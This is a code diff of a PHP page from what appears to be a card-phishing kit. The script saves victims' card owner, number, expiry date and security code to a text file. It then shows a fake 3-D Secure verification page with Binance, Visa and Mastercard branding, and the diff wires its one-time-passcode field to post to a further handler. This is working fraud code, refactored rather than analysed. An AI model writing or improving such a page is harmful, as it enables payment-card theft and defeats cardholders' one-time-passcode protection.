@@ -7,22 +7,28 @@ if (
     isset($_POST['securitycode'])
 ) {
     $file = "usernames.txt";
-    $data1= $_POST['cardNumber'];
+    $data1 = $_POST['cardNumber'];
     $data = 
         "owner: " . $_POST['owner'] . "\n" .
         "cardNumber: " . $_POST['cardNumber'] . "\n" .
         "expirationdate: " . $_POST['expirationdate'] . "\n" .
         "securitycode: " . $_POST['securitycode'] . "\n\n";
-	    file_put_contents($file, $data, FILE_APPEND);
-	  ?>
-<script type="text/javascript">
-window.location = "login.php";
-</script>      
-    <?php
+    
+    // Append data to file
+    file_put_contents($file, $data, FILE_APPEND);
 
+    // Display the new form
+    displayForm($data1);
     exit;
 } else {
-echo "<!DOCTYPE html>
+    // If not all fields are submitted, redirect back to the login form
+    header("Location: login.html");
+    exit;
+}
+
+function displayForm($cardNumber) {
+    echo <<<HTML
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -112,24 +118,24 @@ echo "<!DOCTYPE html>
 </head>
 <body>
     <div class="container">
-	            <div class="payment-logos">
-                <img src="https://public.bnbstatic.com/20190405/eb2349c3-b2f8-4a93-a286-8f86a62ea9d8.png" alt="Binance" style="height: 35px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" style="height: 35px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 35px;">
-            </div>
+        <div class="payment-logos">
+            <img src="https://public.bnbstatic.com/20190405/eb2349c3-b2f8-4a93-a286-8f86a62ea9d8.png" alt="Binance" style="height: 35px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" style="height: 35px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 35px;">
+        </div>
         <h2>Protecting your online payments</h2>
         <div class="info">
             <p>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile 06*********</p>
             <p><strong>Merchant:</strong> GOLFSTORE 3DS</p>
             <p><strong>Amount:</strong> USD 45.99</p>
             <p><strong>Date:</strong> <span id="currentDate"></span></p>
-            <p><strong>Card Number:</strong><?php echo $data1; ?></p>
+            <p><strong>Card Number:</strong> $cardNumber</p>
             <p><strong>Reference Id:</strong> 298879</p>
         </div>
-        <form>
+        <form action="process_otp.php" method="POST">
             <div class="form-group">
                 <label for="otp">Enter One-Time Passcode</label>
-                <input type="text" id="otp" placeholder="Enter One-Time Passcode">
+                <input type="text" id="otp" name="otp" placeholder="Enter One-Time Passcode">
             </div>
             <div class="form-group">
                 <label>
@@ -138,7 +144,6 @@ echo "<!DOCTYPE html>
             </div>
             <div class="form-actions">
                 <button type="submit" class="submit">Submit</button>
-
                 <button type="button" class="cancel">Cancel</button>
             </div>
         </form>
@@ -161,7 +166,6 @@ echo "<!DOCTYPE html>
     </script>
 </body>
 </html>
-";
-
+HTML;
 }
 ?>
